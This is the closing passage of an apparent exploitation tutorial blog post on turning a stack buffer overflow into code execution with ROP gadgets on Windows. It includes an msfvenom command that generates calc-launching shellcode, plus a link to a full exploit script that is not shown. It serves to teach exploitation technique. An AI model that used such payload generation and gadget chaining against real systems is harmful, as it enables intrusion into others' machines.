<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msfvenom -p windows/x64/exec CMD=calc.exe -f ruby -b <span style="color:#0ff;font-weight:bold">&#34;\x09\x0a\x0b\x0c\x0d\x20&#34;</span>
</span></span></code></pre></div><h3 id="span-idb58f0e8ffb4d58f703a8c690da538bc7putting-it-all-togetherspan"><span id='b58f0e8ffb4d58f703a8c690da538bc7'>Putting it all together</span></h3>
<p>The full exploit script is available <a href="/files/when_exploit_mitigations_are_disabled_on_modern_systems/exploit.rb">here</a>.</p>
<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558110452/when_exploit_mitigations_are_disabled_on_modern_systems/pop_calc_inbcqn.gif"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558110452/when_exploit_mitigations_are_disabled_on_modern_systems/pop_calc_inbcqn.gif" alt="Pop Calculator"></a></p>
<h1 id="span-id6f8b794f3246b0c1e1780bb4d4d5dc53conclusionspan"><span id='6f8b794f3246b0c1e1780bb4d4d5dc53'>Conclusion</span></h1>
<p>In the exploit, we have mostly used gadgets that should be present in every executable compiled with <code>mingw-gcc</code>, the only gadgets specific to this executable are the ones reading input (using <code>scanf</code> function), while programs differ in the way they read input, almost any stack buffer overflow can be turned into arbitary code execution using an approach similar to the one explained in this article.</p>

  </div>
  
  <div class="pagination">
    <div class="pagination__title">
      <span
        class="pagination__title-h">Read other posts</span>
      <hr />
    </div>
    <div class="pagination__buttons">
      
      <span class="button previous">
        <a href="https://red0xff.github.io/posts/google_summer_of_code_2020/">
          <span class="button__icon">←</span>
          <span class="button__text">GSoC 2020 - Enhancing metasploit support for &#39;the Hack That Will Never Go Away&#39;</span>
        </a>
      </span>
      
      
      <span class="button next">
        <a href="https://red0xff.github.io/posts/nfsmw2012_making_opponents_fly/">
          <span class="button__text">NFSMW2012 : making opponents fly</span>
          <span class="button__icon">→</span>
        </a>
      </span>
      
    </div>
  </div>
  

  <div id="disqus_thread"></div>
<script type="application/javascript">
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "red0xff" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2023 Powered by <a href="http://gohugo.io">Hugo</a></span>
        <span>:: Proudly hosted on Github</span>
      </div>
    
  </div>
</footer>

<script src="https://red0xff.github.io/assets/main.js"></script>
<script src="https://red0xff.github.io/assets/prism.js"></script>
<script src="https://red0xff.github.io/assets/reminder.js"></script>
<script src="https://red0xff.github.io/assets/codetyper.js"></script>





  
</div>

</body>
</html>
